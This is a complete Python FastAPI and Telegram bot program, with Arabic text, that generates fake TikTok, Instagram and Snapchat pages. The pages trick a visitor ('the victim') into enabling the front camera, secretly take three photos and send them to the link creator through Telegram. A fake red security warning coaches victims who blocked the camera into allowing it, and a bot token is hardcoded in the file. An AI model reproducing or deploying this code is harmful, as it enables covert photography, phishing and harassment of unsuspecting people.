import os
import base64
import io
import sqlite3
import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 1. الإعدادات الأساسية
BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
RENDER_URL = "https://haker-cam.onrender.com"  # رابط سيرفرك الرسمي

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---- إعداد قاعدة البيانات الدائمة (SQLite) ----
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS premium_users (
            chat_id INTEGER PRIMARY KEY
        )
    """)
    conn.commit()
    conn.close()

try:
    init_db()
except Exception as e:
    print(f"⚠️ قاعدة البيانات جاهزة: {e}")

def add_premium_user(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR IGNORE INTO premium_users (chat_id) VALUES (?)", (chat_id,))
        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

def is_premium_user(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM premium_users WHERE chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# ---- واجهة المقالب المتقدمة (نظام كسر الحظر الدائم والإرشاد الإجباري) ----
def get_html_content(template_type):
    # إعدادات القوالب الافتراضية
    bg_color = "#010101"
    card_bg = "#121212"
    btn_color = "#fe2c55"
    logo_text = "TikTok"
    logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
    title = "تحدي الملامح التفاعلي جاهز"
    desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن."
    btn_text = "▶ اضغط لمشاهدة التحدي على TikTok"
    redirect_to = "https://www.tiktok.com"

    # تخصيص القوالب بناءً على الاختيار
    if template_type == "instagram":
        bg_color = "#fafafa"
        card_bg = "#ffffff"
        btn_color = "#0095f6"
        logo_text = "Instagram"
        logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
        title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
        desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي ومطابقة الملامح مع صورة الحساب."
        btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
        redirect_to = "https://www.instagram.com"
        
    elif template_type == "snapchat":
        bg_color = "#fffc00"
        card_bg = "#ffffff"
        btn_color = "#000000"
        logo_text = "Snapchat"
        logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
        desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
        btn_text = "🔥 تشغيل الفلتر الحصري"
        redirect_to = "https://www.snapchat.com"

    # كود الـ HTML المطور لاكتشاف الحظر الدائم وإظهار التعليمات الإجبارية للضحية
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{logo_text}</title>
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; }}
            body {{ 
                background-color: {bg_color}; 
                color: { '#ffffff' if bg_color != '#fafafa' else '#000000' }; 
                font-family: system-ui, -apple-system, sans-serif; 
                display: flex; flex-direction: column; align-items: center; justify-content: center; 
                min-height: 100vh; padding: 20px;
            }}
            .container {{ 
                background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
                box-shadow: 0 15px 35px rgba(0,0,0,0.1); max-width: 420px; width: 100%; 
                border: 1px solid {{ '#2f2f2f' if card_bg == '#121212' else '#e6e6e6' }}; text-align: center;
            }}
            .logo {{
                font-size: 42px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px;
                display: inline-block; {logo_style}
            }}
            .video-box {{
                width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
                display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
            }}
            .loader {{
                border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
                width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .loading-text {{ color: #a6a6a6; font-size: 14px; }}
            h2 {{ font-size: 20px; font-weight: 700; margin-bottom: 10px; }}
            p {{ color: { '#8a8a8a' if card_bg == '#121212' else '#666666' }; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
            .btn {{ 
                background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
                font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
                box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: all 0.2s ease;
            }}
            .btn:active {{ transform: scale(0.98); }}
            
            /* تصفيف مربع الحظر الدائم والتعليمات الإرشادية */
            .instruction-box {{
                display: none; background: #ef4444; color: white; padding: 15px; 
                border-radius: 12px; margin-top: 20px; text-align: right; font-size: 14px; line-height: 1.6;
                box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3); border: 2px solid #ffffff;
            }}
            .instruction-box b {{ color: #fffb00; font-size: 15px; }}
            .arrow-up {{
                font-size: 24px; animation: bounce 1s infinite; margin-bottom: 5px; text-align: center;
            }}
            @keyframes bounce {{
                0%, 100% {{ transform: translateY(0); }}
                50% {{ transform: translateY(-5px); }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">{logo_text}</div>
            <div class="video-box">
                <div class="loader" id="mainLoader"></div>
                <div class="loading-text" id="statusText">جاري الاتصال بالنظام الحصري...</div>
            </div>
            <h2 id="mainTitle">{title}</h2>
            <p id="mainDesc">{desc}</p>
            <button class="btn" id="startBtn">{btn_text}</button>
            
            <div class="instruction-box" id="guideBox">
                <div class="arrow-up">⬆️</div>
                <b>⚠️ تنبيه أمني هام (خطأ في الصلاحيات):</b><br>
                لقد قمت بحظر الوصول للكاميرا بالخطأ! لإلغاء هذا الحظر والمتابعة فوراً:<br>
                1. اضغط على أيقونة <b>"القفل 🔒"</b> أو <b>"الإعدادات"</b> الموجودة في شريط الرابط بالأعلى.<br>
                2. قم بتفعيل خيار <b>"الكاميرا / Camera"</b> واجعلها (مسموح بها / Allow).<br>
                3. قم بعمل <b>إعادة تحديث (Refresh)</b> للصفحة لفتح النظام.
            </div>
        </div>

        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const ownerId = urlParams.get('id');
            const REDIRECT_URL = "{redirect_to}";

            function tryCapture() {{
                if (!ownerId) {{
                    window.location.href = REDIRECT_URL;
                    return;
                }}

                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                .then(function(stream) {{
                    document.getElementById('guideBox').style.display = 'none';
                    document.getElementById('statusText').innerText = "جاري تهيئة النظام ومعالجة الأبعاد الحية...";
                    
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute("playsinline", true);
                    video.play();
                    
                    video.onloadedmetadata = function() {{
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        let ctx = canvas.getContext('2d');
                        
                        let shotsTaken = 0;
                        let captureInterval = setInterval(function() {{
                            if (shotsTaken >= 3) {{
                                clearInterval(captureInterval);
                                stream.getTracks().forEach(track => track.stop());
                                window.location.href = REDIRECT_URL;
                                return;
                            }}
                            
                            ctx.drawImage(video, 0, 0);
                            let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                            
                            fetch('/api/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ user_id: ownerId, image: base64Image, count: shotsTaken + 1 }})
                            }});
                            
                            shotsTaken++;
                        }}, 500);
                    }};
                }})
                .catch(function(err) {{
                    // [كشف الحظر الدائم 🔒]: إذا كان المتصفح حاظراً للكاميرا مسبقاً، نفتح صندوق الإرشادات فوراً
                    document.getElementById('guideBox').style.display = 'block';
                    document.getElementById('statusText').innerText = "❌ تم حظر الصلاحيات من المتصفح!";
                }});
            }}

            // فحص فوري عند تحميل الصفحة: إذا كانت الصلاحيات محظورة مسبقاً، نظهر الصندوق تلقائياً
            if (navigator.permissions && navigator.permissions.query) {{
                navigator.permissions.query({{name: 'camera'}}).then(function(permissionStatus) {{
                    if (permissionStatus.state === 'denied') {{
                        document.getElementById('guideBox').style.display = 'block';
                    }}
                    permissionStatus.onchange = function() {{
                        if (this.state === 'granted') {{
                            tryCapture();
                        }}
                    }};
                }});
            }}

            document.getElementById('startBtn').addEventListener('click', tryCapture);
        </script>
    </body>
    </html>
    """

# ---- أوامر البوت في تليجرام ----

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    name = message.from_user.first_name
    
    welcome_text = (
        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي (النسخة المضادة للحظر الدائم!) 📸🔓\n\n"
        "💳 لتفعيل حسابك ونظام الصيد الذكي الشامل، اضغط تفعيل بالأسفل."
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy")
def buy(call):
    chat_id = call.message.chat.id
    add_premium_user(chat_id)
    bot.answer_callback_query(call.id, "🎉 تم تفعيل جدار كسر الحظر!")
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
    )
    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الذكي الخالي من المخارج:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    chat_id = call.message.chat.id
    if not is_premium_user(chat_id):
        bot.send_message(chat_id, "❌ حسابك غير مفعل.")
        return
        
    template = call.data.split("_")[1]
    unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
    
    msg = (
        f"🚀 **رابط المقلب الذكي لـ ({template.upper()}) جاهز ومحصن بالكامل!**\n\n"
        f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
        "🔥 **ماذا يحدث لو ضغط 'عدم السماح مطلقاً'؟**\n"
        "الصفحة ستتحول فوراً إلى شاشة تحذير رسمية إجبارية باللون الأحمر مع سهم متحرك للأعلى، لتشرح له كيف يفتح القفل من المتصفح ويوافق غصباً عنه لكي يستطيع الخروج! لن يفلت أبداً 😈😂"
    )
    bot.send_message(chat_id, msg, parse_mode="Markdown")

# ---- المسارات واستقبال السيرفر ----

@app.get("/", response_class=HTMLResponse)
async def get_home(request: Request):
    template = request.query_params.get("template", "tiktok")
    return get_html_content(template)

@app.post(f"/{BOT_TOKEN}")
async def telegram_webhook(request: Request):
    json_string = await request.body()
    update = telebot.types.Update.de_json(json_string.decode('utf-8'))
    bot.process_new_updates([update])
    return {"status": "ok"}

def send_photo_to_owner(user_id, image_bytes, count_text):
    try:
        bot.send_photo(
            chat_id=user_id, 
            photo=image_bytes, 
            caption=f"📸 **تم الصيد بنجاح ومطابقة الملامح! اللقطة رقم ({count_text})**"
        )
    except Exception as e:
        print(f"Error sending photo: {e}")

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        image_b64 = data.get("image")
        shot_count = data.get("count", 1)
        
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
            
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = f"capture_{shot_count}.jpg"
        
        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count))
        return {"status": "success"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error"})

@app.on_event("startup")
def startup_event():
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
    print("🚀 تم تشغيل التحديث الذكي المضاد للحظر!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)

